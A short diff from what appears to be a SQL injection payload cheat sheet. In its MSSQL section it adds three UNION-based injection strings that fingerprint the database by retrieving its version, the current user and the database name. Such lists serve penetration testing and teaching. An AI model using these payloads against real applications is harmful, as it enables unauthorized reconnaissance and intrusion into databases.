@@ -76,7 +76,13 @@ After stuffing the input fields you should either obtain access to the system as
 #### MSSQL
 
 ```txt
-' UNION ALL SELECT @@VERSION, NULL--
+# Fingerprinting
+' UNION ALL SELECT 1,@@VERSION,3--
+' UNION ALL SELECT 1,SYSTEM_USER,3--
+' UNION ALL SELECT 1,DB_NAME(),3--
+
+
+
 ```
 
 #### PostgreSQL
